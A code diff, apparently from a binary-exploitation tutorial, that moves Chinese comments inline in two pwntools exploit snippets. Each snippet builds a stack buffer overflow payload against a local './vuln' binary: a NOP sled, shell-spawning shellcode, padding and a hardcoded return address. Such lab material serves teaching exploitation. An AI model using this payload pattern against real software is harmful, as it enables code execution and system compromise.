@@ -97,14 +97,10 @@ context.binary = ELF('./vuln')
 
 p = process()
 
-# 构建 NOPs
-payload = b'\x90' * 240
-# 构建 shellcode
-payload += asm(shellcraft.sh())
-# 溢出 Padding
-payload = payload.ljust(312, b'A')
-# 缓冲区地址 + 一半 NOPs 长度
-payload += p32(0xffffd664 + 120)
+payload = b'\x90' * 240             # 构建 NOPs
+payload += asm(shellcraft.sh())     # 构建 shellcode
+payload = payload.ljust(312, b'A')  # 溢出 Padding
+payload += p32(0xffffd664 + 120)    # 缓冲区地址 + 一半 NOPs 长度
 
 p.sendline(payload)
 
@@ -136,14 +132,10 @@ context.binary = ELF('./vuln')
 
 p = process()
 
-# 构建 NOPs
-payload = asm(shellcraft.nop()) * 240
-# 构建 shellcode
-payload += asm(shellcraft.sh())
-# 溢出 Padding
-payload = payload.ljust(312, b'A')
-# 缓冲区地址 + 一半 NOPs 长度
-payload += p32(0xffffd664 + 120)
+payload = asm(shellcraft.nop()) * 240  # 构建 NOPs
+payload += asm(shellcraft.sh())        # 构建 shellcode
+payload = payload.ljust(312, b'A')     # 溢出 Padding
+payload += p32(0xffffd664 + 120)       # 缓冲区地址 + 一半 NOPs 长度
 
 p.sendline(payload)
 
